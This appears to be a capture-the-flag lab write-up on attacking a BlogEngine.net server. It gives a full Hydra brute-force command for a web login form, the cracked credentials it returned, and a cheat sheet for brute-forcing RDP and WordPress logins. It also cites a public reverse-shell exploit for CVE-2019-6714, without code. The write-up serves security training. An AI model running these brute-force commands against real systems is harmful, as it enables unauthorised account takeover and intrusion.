# HackPark
* Hack Windows with Hydra, Remote Code Execution, and WinPEAS.
## Brute-force a login using Hydra
* Hydra is parallised, fast and flexible login cracker.
* Brute-forcing can be trying every password combination.
* Dictionary brute forcing iterates through a wordlist to obtain the password.
#### 1. Identify login page method.
* Web servers typically make two types of requests.
  * **GET** request used to request data.
  * **POST** used to send data.
1. Right click on login form.
2. **Inspect** element.
3. Enter any credentials and attempt to login
4. Read **Method** field value in **Network** tab.
* Can also identify this by intercepting traffic through BurpSuite.
#### 2. Use Hydra to brute force the login form.
* Login or Wordlist for Usernames = `admin`.
  * Internet search for "blogengine.net" default credentials returns "admin" / "admin".
* Password or Wordlist for Passwords = `/usr/share/wordlists/rockyou.txt`.
* IP address or Hostname = 10.10.85.185.
* HTTP Method (POST/GET) = `http-form-post`.
* Directory/Path to the Login Page = `/Account/login.aspx?ReturnURL=/admin`.
  * Request header **File** attribute.
* Request Body for Username/Password = `"ctl00$MainContent$LoginUser$UserName","ctl00$MainContent$LoginUser$Password","ctl00$MainContent$LoginUser$LoginButton"`
  * **Inspect Element** in browser.
  * **Network** tab of developer tools.
  * Attempt a login.
  * Right click on request > **Edit and Resend**.
  * **Request Body** contains entered username and password.
```
__VIEWSTATE=n2Y4BvVM5bhPxAiXh74eXb7%2F8bdFppITpAKoQzTYg%2F2Om8M2jGykZaw0JQHHB7hSlgHYkUTBvZKICSfpKgSGO7WToz%2F5w8knI%2BcOvKnYLsFIoll7jX6KwikzZLXashyviPyM9cozXH3WjB1ntR6ZDzvWtv11PxlYsmLCF4cBDmyAIQZ8wcagcXhF%2BssBYrpkopBVNWT03AkHUXHBVrSr%2BtiPAHdxdQJgEwOrY2c6otNnHWnwHZ8M%2FwlLhfplATLyIIfw00UzSNyS9IO7iuKLDQfvVv9SlS5LxbJj%2FZiOTaFIwfsvD8GYpSOmkxhb8mnfa46dJ5GYwACBfy1xWPRhtGbfz1gUOunVnQ1n9GjBPnqiWjiD&__EVENTVALIDATION=YN0knyrHqnj2RIDRzLwosbSl6DHwbB8zpiYoY%2FMw4N0J0gthwdTUm6moqRkULBrBukYlEAJq9Mwxc5Yfi4TBMemG8xjPaVMXN2P6AM0MY5ssFs2K93q4Xn4am8cO2wzdh3TMIbY%2BOifwxGGvHMA6RJIHcpVe%2FjrCVFdCaR2RjG%2FhIpRl&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=test&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```
  * Replace entered username with `^USER^ to tell Hydra to enter words from wordlist in this position of the request.
  * Replace entered password with ^PASS^.
* Way to Identify Failed Attempts = `Login failed`.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.85.185 http-form-post "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=n2Y4BvVM5bhPxAiXh74eXb7%2F8bdFppITpAKoQzTYg%2F2Om8M2jGykZaw0JQHHB7hSlgHYkUTBvZKICSfpKgSGO7WToz%2F5w8knI%2BcOvKnYLsFIoll7jX6KwikzZLXashyviPyM9cozXH3WjB1ntR6ZDzvWtv11PxlYsmLCF4cBDmyAIQZ8wcagcXhF%2BssBYrpkopBVNWT03AkHUXHBVrSr%2BtiPAHdxdQJgEwOrY2c6otNnHWnwHZ8M%2FwlLhfplATLyIIfw00UzSNyS9IO7iuKLDQfvVv9SlS5LxbJj%2FZiOTaFIwfsvD8GYpSOmkxhb8mnfa46dJ5GYwACBfy1xWPRhtGbfz1gUOunVnQ1n9GjBPnqiWjiD&__EVENTVALIDATION=YN0knyrHqnj2RIDRzLwosbSl6DHwbB8zpiYoY%2FMw4N0J0gthwdTUm6moqRkULBrBukYlEAJq9Mwxc5Yfi4TBMemG8xjPaVMXN2P6AM0MY5ssFs2K93q4Xn4am8cO2wzdh3TMIbY%2BOifwxGGvHMA6RJIHcpVe%2FjrCVFdCaR2RjG%2FhIpRl&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vV
```
* Valid credentials discovered.
```
[80][http-post-form] host: 10.10.85.185   login: admin   password: 1qaz2wsx
```
* Hydra mini cheatsheet.
| Command | Description
| --- | ---
| `hydra -P <wordlist> -v <ip> <protocol> | Brute force against specific protocol.
| `hydra -v -V -L <username list> -P <password list> -t ` -u <p> <protocol>` | Bruteforce usernames. Loops through every combination in the lists.  `-v -V` verbose mode showing login attempts.
| `hydra -t 1 -V -f -l <username> -P <password list> rdp://<ip>` | Bruteforce Windows Remote Desktop using password list.
| `hydra -l <username> -P <password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | Craft more specific request to bruteforce.
## Compromise the target
* Identify and execute public exploit to gain initial access to Windows target.
* [Exploit-Database](http://www.exploit-db.com/) is Common Vulnerability and Exposures (CVE) archive of public exploits.
  * Used by pentesters and vulnerability researchers.
  * Owned by Offensive Security.
* Log into blogengine.net website on target using bruteforces credentials.
* Burger menu > About shows version as 3.3.6.0.
* [Identify exploit from Exploit Database](https://www.exploit-db.com/exploits/46353) to gain reverse shell.
  * Application is vulnerable to [CVE-2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714).
* 
## Windows Privilege Escalation
## Privilege Escalation Without Metasploit
